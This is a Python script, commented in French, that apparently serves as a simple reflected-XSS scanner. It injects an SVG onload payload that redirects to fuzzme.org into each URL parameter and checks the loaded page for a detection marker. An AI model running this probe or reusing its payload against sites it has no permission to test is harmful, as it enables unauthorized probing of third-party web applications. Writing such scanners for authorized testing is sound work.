from selenium import webdriver
from selenium.common.exceptions import *
from urllib.parse import urlparse
from urllib.parse import parse_qs
import warnings
warnings.filterwarnings('ignore')# On caches les avertisements 

try:
	driver = webdriver.PhantomJS("C:\\Users\\lucas-pc\\Desktop\\phantomjs.exe");# Connexion au driver + emplacement du driver
except WebDriverException as exception:
	print('[!] Impossible de se connecter au driver');
	print('Vérifier l\'emplacement du chemin du driver');
	exit();

'''Fonction qui retourne TRUE si une URL fournit provoque une redirection'''
def xss(URL):

	driver.get(URL);# Connexion à l'url
	page = driver.page_source;# On récupére le corp de la page
	if '1ts+Vu1nerab1e!' in page: # Si le mot-clée est trouver dans la page alors c'est vulnérable
		return True;
	else:
		return False;


'''fonction qui permet de injecter un payload dans chaque paramètres d'une URL en conversant leurs valeur d'origine
Retourne une liste avec les URL prêt à être passer dans un fuzzeur'''

def inject(URL, PAYLOAD):

	output = urlparse(URL);# Création d'un object urlparse

	valid = False

	
	if output[4] == "": # On Vérifie si y a bien un query dans l'URL
		print("URL invalid !")
		exit();
		

	ParameterAndValue = parse_qs(output.query, keep_blank_values=0);#Création d'un dico avec Para et Value

	Parameter = [];
	Value = [];
	ValueCopy =  [];

	for p in ParameterAndValue:# Récupération de tout les paramètres
		Parameter.append(p);

	for v in ParameterAndValue.values():# Récupération de tout les valeurs des paramètres
		Value.append(''.join(v));
		ValueCopy.append(''.join(v));# Création d'une copy de Value

	RealURL = output.scheme+"://"+output.netloc+output.path+"?"; # Reconstitution de l'URL (http+hôte+chemin)

	ListQuery = [] # Création d'un liste avec tout les paramètres et les valeurs

	# Configuration pour la boucle
	NemberOfQuery = len(Value)
	i = 0

	# Création de la liste
	while i < NemberOfQuery:
		ListQuery.append(Parameter[i])
		ListQuery.append("=")
		ListQuery.append(Value[i])
		ListQuery.append("&")
		i += 1

	del ListQuery[-1] # Netoyage de la liste

	# Configuration pour la boucle
	i = 2
	x = 0

	Result = [];

	while i < len(ListQuery):
	# Injection du payload
		ListQuery[i] = PAYLOAD

		# Création de l'URL pret à être injecter
		FinalQuery = RealURL + ''.join(ListQuery)
		# On stocke les URLs dans un tableaux qui seras retourner par notre fonction
		Result.append(FinalQuery)
		# Après l'injection on remet la valeur d'origine
		ListQuery[i] = ValueCopy[x]
		i += 4
		x += 1

	return Result

banner = """
 __  __  ___   ___                    
 \ \/ / / __| / __|  __   __ _   _ _  
  >  <  \__ \ \__ \ / _| / _` | | ' \ 
 /_/\_\ |___/ |___/ \__| \__,_| |_||_|
                                                 
 """
print(banner)


URL = input('[?] URL : ')
AllURL = inject(URL , '"><svg/onload=location.href="http://fuzzme.org/detect.html">')
for u in AllURL:
	if xss(u):
		print(u, ' => Vulnérable à la faille XSS')
	else:
		print(u, ' => N\' est pas vulnérable')

Again = True


while Again == True:
	Choice = input('Voulez vous encore scanner des URLs (y/n) ? ')

	if Choice == 'y':
		Again = True
	elif Choice == 'n':
		Again = False
		print('Bye-Bye')
		exit();
	else:
		print("Choix invalide")
		exit();

	URL = input('[?] URL : ')
	AllURL = inject(URL , '"><svg/onload=location.href="http://fuzzme.org/detect.html">')
	for u in AllURL:
		if xss(u):
			print(u, ' => Vulnérable à la faille XSS')
		else:
			print(u, ' => N\' est pas vulnérable')
